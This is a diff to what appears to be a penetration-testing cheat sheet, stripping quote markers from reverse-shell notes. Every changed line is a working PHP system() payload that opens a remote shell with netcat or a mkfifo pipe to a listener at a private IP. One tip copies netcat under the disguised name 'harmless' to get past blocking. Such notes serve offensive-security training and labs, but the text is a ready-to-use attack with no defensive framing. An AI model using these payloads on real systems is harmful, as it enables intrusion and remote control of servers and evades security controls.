@@ -11,15 +11,15 @@ Open listening port on local machine:
 nc -lvnp 1234
 
 Connect to local from remote:
-> <?php system('nc -e /bin/sh 10.0.0.1 1234') ?>
+<?php system('nc -e /bin/sh 10.0.0.1 1234') ?>
 
 Or
-> <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f') ?>
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f') ?>
 
 If having issues with netcat, could be blocked. Copy it to a new location and give safe name (ie: harmless)
-> <?php system('cp /bin/nc /dev/shm/harmless') ?>
-> <?php system('chmod +x /dev/shm/harmless') ?>
+<?php system('cp /bin/nc /dev/shm/harmless') ?>
+<?php system('chmod +x /dev/shm/harmless') ?>
 
 Connect to local host with harmless netcat:
-> <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/harmless 10.10.0.1               1234 >/tmp/f') ?>
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/harmless 10.10.0.1 1234 >/tmp/f') ?>
 
